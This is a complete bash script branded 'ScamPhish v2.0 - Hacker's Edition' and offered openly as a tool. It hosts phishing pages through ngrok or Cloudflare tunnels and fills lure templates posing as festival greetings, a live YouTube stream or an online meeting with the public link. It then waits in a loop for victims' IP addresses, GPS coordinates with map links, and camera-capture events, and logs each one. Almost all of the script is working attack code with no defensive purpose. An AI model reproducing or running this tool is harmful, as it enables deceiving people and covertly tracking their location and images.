#!/bin/bash
# ScamPhish v2.0 - Hacker's Edition
# Powered by Team-Dark | T-D Organisation

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo -e "\033[1;31m[!]\033[0m \033[1;93mWindows System Detected - Adapting Commands...\033[0m"
  
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

# ============ HACKING THEME BANNER ============
banner() {
clear
echo -e "\033[1;31m"
cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║  ▄▄▄·  ▄▄▄· ▄▄▄  ▄▄▄ . ▄▄▄▄▄ ▄ .▄ ▄▄▄▄▄       ▄▄▄· ▄▄▄▄▄ ▄▄▄▄▄ ▄ .▄ ║
    ║ ▐█ ▀█ ▐█ ▄█▐█ ▀█ ▀▄.▀·•██  ██▪▐█•██       ▐█ ▄█•██  •██  ██▪▐█ ║
    ║ ▄█▀▀█ ▐█▀▀█▄█▀▀█ ▐▀▀▪▄ ▐█.▪██▀▐█ ▐█.▪       ██▀· ▐█.▪ ▐█.▪██▀▐█ ║
    ║ ▐█ ▪▐▌██▄▪▐█▐█ ▪▐▌▐█▄▄▌ ▐█▌·██▌▐▀ ▐█▌·      ▐█▪·• ▐█▌· ▐█▌·██▌▐▀ ║
    ║  ▀  ▀ ·▀▀▀▀  ▀  ▀  ▀▀▀  ▀▀▀ ▀▀▀ · ▀▀▀       .▀    ▀▀▀  ▀▀▀ ▀▀▀ · ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "\033[1;32m"
cat << "EOF"
    ┌─────────────────────────────────────────────────────────────┐
    │  ░██████╗░█████╗░██████╗░███╗░░░███╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗
    │  ██╔════╝██╔══██╗██╔══██╗████╗░████║██╔══██╗██║░░██║██║██╔════╝██║░░██║
    │  ╚█████╗░██║░░╚═╝██████╔╝██╔████╔██║██████╔╝███████║██║╚█████╗░███████║
    │  ░╚═══██╗██║░░██╗██╔═══╝░██║╚██╔╝██║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║
    │  ██████╔╝╚█████╔╝██║░░░░░██║░╚═╝░██║██║░░░░░██║░░██║██║██████╔╝██║░░██║
    │  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝
    └─────────────────────────────────────────────────────────────┘
EOF
echo -e "\033[1;35m"
cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════╗
    ║  [●] Version: 2.0 - Black Edition                                ║
    ║  [●] Author: Team-Dark                                           ║
    ║  [●] Status: [ACTIVE]                                            ║
    ║  [●] DarkWeb: yrar56zva7yybdbqvamsnve5w6eyp3y3ciffp7qkxghef6jhgnnwylad.onion ║
    ╚══════════════════════════════════════════════════════════════════╝
EOF
echo -e "\033[0m"
printf "\n"
}

# ============ LOADING ANIMATION ============
loading_animation() {
    echo -ne "\033[1;36m[●]\033[0m \033[1;93mInitializing modules"
    for i in {1..3}; do
        sleep 0.5
        echo -ne "."
    done
    echo -e " \033[1;32m[DONE]\033[0m"
}

# ============ DEPENDENCY CHECK ============
dependencies() {
echo -e "\033[1;36m[●]\033[0m \033[1;93mChecking Dependencies...\033[0m"
sleep 1
command -v php > /dev/null 2>&1 || { 
    echo -e "\033[1;31m[✘]\033[0m \033[1;93mPHP not found! Install it. Aborting.\033[0m"
    exit 1
}
echo -e "\033[1;32m[✔]\033[0m \033[1;93mPHP Found\033[0m"
sleep 0.5
}

# ============ STOP FUNCTION ============
stop() {
echo -e "\n\033[1;31m[!]\033[0m \033[1;93mTerminating Sessions...\033[0m"
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  pkill -f -2 ngrok > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
  killall -2 php > /dev/null 2>&1
  pkill -f -2 cloudflared > /dev/null 2>&1
  killall -2 cloudflared > /dev/null 2>&1
fi
echo -e "\033[1;32m[✔]\033[0m \033[1;93mCleanup Complete. Exiting.\033[0m"
exit 1
}

# ============ IP CAPTURE ============
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
echo -e "\033[1;31m[⚡]\033[0m \033[1;92mTARGET IP CAPTURED:\033[0m \033[1;37m$ip\033[0m"
cat ip.txt >> saved.ip.txt
}

# ============ LOCATION CAPTURE ============
catch_location() {
  if [[ -e "current_location.txt" ]]; then
    echo -e "\033[1;32m[🌍]\033[0m \033[1;92mGEOLOCATION DATA RECEIVED\033[0m"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    echo ""
    mv current_location.txt current_location.bak
  fi

  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    echo -e "\033[1;36m[📍]\033[0m \033[1;93mLAT:\033[0m \033[1;37m$lat\033[0m"
    echo -e "\033[1;36m[📍]\033[0m \033[1;93mLON:\033[0m \033[1;37m$lon\033[0m"
    echo -e "\033[1;36m[📍]\033[0m \033[1;93mACC:\033[0m \033[1;37m${acc}m\033[0m"
    echo -e "\033[1;36m[🗺️]\033[0m \033[1;93mMAPS:\033[0m \033[1;34m$maps_link\033[0m"
    
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    mv "$location_file" saved_locations/
    echo -e "\033[1;32m[💾]\033[0m \033[1;93mLocation Saved:\033[0m \033[1;37msaved_locations/$location_file\033[0m"
  fi
}

# ============ LISTENER FUNCTION ============
checkfound() {
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

echo ""
echo -e "\033[1;33m┌════════════════════════════════════════════════════════════┐\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;32m[🎯]\033[0m \033[1;93mLISTENER ACTIVE - WAITING FOR TARGET\033[0m                    \033[1;33m│\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;32m[🌍]\033[0m \033[1;93mGPS TRACKING:\033[0m \033[1;92mENABLED\033[0m                                  \033[1;33m│\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;32m[⌨️]\033[0m \033[1;93mPress \033[1;31mCtrl+C\033[0m \033[1;93mto stop listener\033[0m                           \033[1;33m│\033[0m"
echo -e "\033[1;33m└════════════════════════════════════════════════════════════┘\033[0m"
echo ""

while [ true ]; do
if [[ -e "ip.txt" ]]; then
echo -e "\n\033[1;31m[🔥]\033[0m \033[1;92mTARGET CONNECTED! Capturing Data...\033[0m"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "current_location.txt" ]]; then
echo -e "\n\033[1;32m[🌍]\033[0m \033[1;92mLOCATION DATA INCOMING!\033[0m"
catch_location
fi

if [[ -e "LocationLog.log" ]]; then
echo -e "\n\033[1;32m[🌍]\033[0m \033[1;92mLOCATION DATA CAPTURED!\033[0m"
catch_location
rm -rf LocationLog.log
fi

if [[ -e "LocationError.log" ]]; then
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
echo -e "\n\033[1;31m[📸]\033[0m \033[1;92mCAMERA DATA RECEIVED!\033[0m"
rm -rf Log.log
fi
sleep 0.5
done 
}

# ============ CLOUDFLARE TUNNEL ============
cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo -e "\033[1;31m[✘]\033[0m \033[1;93munzip missing\033[0m"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo -e "\033[1;31m[✘]\033[0m \033[1;93mwget missing\033[0m"; exit 1; }
echo -e "\033[1;36m[●]\033[0m \033[1;93mDownloading Cloudflared...\033[0m"

arch=$(uname -m)
os=$(uname -s)

if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    chmod +x cloudflared.exe
    echo '#!/bin/bash' > cloudflared
    echo './cloudflared.exe "$@"' >> cloudflared
    chmod +x cloudflared
else
    if [[ "$os" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        tar -xzf cloudflared.tgz > /dev/null 2>&1
        chmod +x cloudflared
        rm cloudflared.tgz
    else
        case "$arch" in
            "x86_64") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
            "aarch64"|"arm64") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1 ;;
            *) wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
        esac
        chmod +x cloudflared
    fi
fi
fi

echo -e "\033[1;36m[●]\033[0m \033[1;93mStarting PHP Backend...\033[0m"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
echo -e "\033[1;36m[●]\033[0m \033[1;93mEstablishing Cloudflare Tunnel...\033[0m"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
echo -e "\033[1;31m[✘]\033[0m \033[1;93mTunnel Failed! Check network or try ngrok.\033[0m"
exit 1
else
echo -e "\033[1;32m[✔]\033[0m \033[1;93mTunnel Established:\033[0m \033[1;36m$link\033[0m"
fi
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

# ============ NGrok SERVER ============
ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo -e "\033[1;31m[✘]\033[0m \033[1;93munzip missing\033[0m"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo -e "\033[1;31m[✘]\033[0m \033[1;93mwget missing\033[0m"; exit 1; }
echo -e "\033[1;36m[●]\033[0m \033[1;93mDownloading Ngrok...\033[0m"

arch=$(uname -m)
os=$(uname -s)

if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1
    chmod +x ngrok.exe
    rm -rf ngrok.zip
else
    if [[ "$os" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    else
        case "$arch" in
            "x86_64") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1 ;;
            "aarch64"|"arm64") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1 ;;
            *) wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1 ;;
        esac
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    fi
fi
fi

if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Change ngrok authtoken? [y/N]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1 &
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1 &
    fi
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Change ngrok authtoken? [y/N]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
    fi
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
echo -e "\033[1;31m[✘]\033[0m \033[1;93mNgrok Failed! Check authtoken.\033[0m"
exit 1
else
echo -e "\033[1;32m[✔]\033[0m \033[1;93mNgrok Tunnel:\033[0m \033[1;36m$link\033[0m"
fi
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

# ============ MAIN MENU ============
scamphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

echo ""
echo -e "\033[1;33m┌══════════════════════════════════════════┐\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;36m[\033[0m \033[1;31m01\033[0m \033[1;36m]\033[0m \033[1;93mNgrok Tunnel\033[0m                         \033[1;33m│\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;36m[\033[0m \033[1;31m02\033[0m \033[1;36m]\033[0m \033[1;93mCloudflare Tunnel\033[0m                      \033[1;33m│\033[0m"
echo -e "\033[1;33m└══════════════════════════════════════════┘\033[0m"

default_option_server="1"
read -p $'\n\033[1;32m[→]\033[0m \033[1;93mSelect Tunnel\033[0m \033[1;36m[1/2]\033[0m \033[1;93m[Default: 1]:\033[0m ' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
echo -e "\033[1;31m[!] Invalid!\033[0m"
sleep 1
clear
scamphish
fi
}

# ============ TEMPLATE SELECTION ============
select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
echo -e "\033[1;31m[!] Invalid!\033[0m"
sleep 1
clear
banner
scamphish
else
echo ""
echo -e "\033[1;33m┌══════════════════════════════════════════┐\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;36m[\033[0m \033[1;31m01\033[0m \033[1;36m]\033[0m \033[1;93mFestival Wishing\033[0m                      \033[1;33m│\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;36m[\033[0m \033[1;31m02\033[0m \033[1;36m]\033[0m \033[1;93mLive YouTube TV\033[0m                        \033[1;33m│\033[0m"
echo -e "\033[1;33m│\033[0m \033[1;36m[\033[0m \033[1;31m03\033[0m \033[1;36m]\033[0m \033[1;93mOnline Meeting\033[0m                         \033[1;33m│\033[0m"
echo -e "\033[1;33m└══════════════════════════════════════════┘\033[0m"

default_option_template="1"
read -p $'\n\033[1;32m[→]\033[0m \033[1;93mSelect Template\033[0m \033[1;36m[1/2/3]\033[0m \033[1;93m[Default: 1]:\033[0m ' option_tem
option_tem="${option_tem:-${default_option_template}}"

if [[ $option_tem -eq 1 ]]; then
read -p $'\n\033[1;32m[→]\033[0m \033[1;93mEnter Festival Name:\033[0m ' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\033[1;32m[→]\033[0m \033[1;93mEnter YouTube Video ID:\033[0m ' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
echo ""
else
echo -e "\033[1;31m[!] Invalid!\033[0m"
sleep 1
select_template
fi
fi
}

# ============ EXECUTION ============
banner
loading_animation
dependencies
scamphish
